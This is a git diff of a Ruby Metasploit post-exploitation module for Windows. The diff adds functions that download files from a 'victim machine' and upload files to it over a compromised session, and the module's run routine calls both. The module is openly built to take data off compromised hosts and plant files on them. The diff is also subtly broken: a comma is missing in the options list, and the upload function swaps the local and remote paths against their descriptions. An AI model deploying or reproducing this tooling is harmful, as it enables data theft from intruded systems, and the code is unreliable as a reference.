@@ -12,9 +12,9 @@ class MetasploitModule < Msf::Post
     super(
       update_info(
         info,
-        'Name' => 'files manager for windows',
+        'Name' => 'directories comparator for windows',
         'Description' => %q{
-          get a resource from a system windows
+          compare files on host system and victim system
         },
         'License' => MSF_LICENSE,
         'Author' => [ 'Adil et Lazare' ],
@@ -44,6 +44,10 @@ class MetasploitModule < Msf::Post
         OptString.new('STARTING_POINT_VICTIM', [true, 'Starting point', 'C:\\']),
         OptBool.new('VERBOSE', [false, 'verbose mode', false]),
         OptString.new('FILE_NAME', [false, 'search a specific file. If this option is enabled, it will just try to find this file.', ''])
+        OptString.new('FILE_TO_DOWNLOAD', [false, 'File to download from victim machine', '']),
+        OptString.new('LOCATION_TO_SEND', [false, 'Location where file will be uploaded on victim machine', '']),
+        OptPath.new('FILE_TO_UPLOAD', [false, 'file to upload on victim machine', '']),
+        OptPath.new('LOCATION_TO_RECEIVE', [false, 'location where file will be received on host machine', '']),
       ]
     )
   end
@@ -119,10 +123,10 @@ def extract_filenames(files, regex)
 end
 
 def compare_files_list(liste_files1, liste_files2)
-  # Fusionner les deux tableaux et supprimer les doublons
+  # fusion des tableaux et suppression les doublons
   res = (liste_files1 + liste_files2).uniq
   
-  # Sélectionner les éléments qui ne sont présents qu'une seule fois
+  # Selection les éléments qui ne sont présents qu'une seule fois
   liste_rest = res.select { 
     |item| (liste_files1.include?(item) && !liste_files2.include?(item)) || (!liste_files1.include?(item) && liste_files2.include?(item)) 
   }
@@ -130,8 +134,51 @@ def compare_files_list(liste_files1, liste_files2)
   return liste_rest
 end
 
+def upload_file()
+
+  remote_path = datastore['FILE_TO_UPLOAD']
+  local_path = datastore['LOCATION_TO_RECEIVE']
+
+  if remote_path.empty? || local_path.empty? then
+    return
+  end
+
+  print_status("Uploading #{local_path} to #{remote_path}...")
+
+  begin
+    contents = ::File.read(local_path)
+    session.fs.file.upload_file(remote_path, contents)
+    print_good("File uploaded successfully.")
+  rescue ::Exception => e
+    print_error("Failed to upload file: #{e.message}")
+  end
+end
+
+def download_file()
+
+  remote_path = datastore['FILE_TO_DOWNLOAD']
+  local_path = datastore['LOCATION_TO_SEND']
+
+  if remote_path.empty? || local_path.empty? then
+    return
+  end
+
+  print_status("Downloading #{remote_path} to #{local_path}...")
+
+  begin
+    contents = session.fs.file.download_file(remote_path)
+    ::File.open(local_path, 'wb') { |file| file.write(contents) }
+    print_good("File downloaded successfully.")
+  rescue ::Exception => e
+    print_error("Failed to download file: #{e.message}")
+  end
+end
+
 def run
     
+  upload_file
+  download_file
+
     if datastore['FILE_NAME'] != '' then 
       find_single_file_on_victim_post()
       return
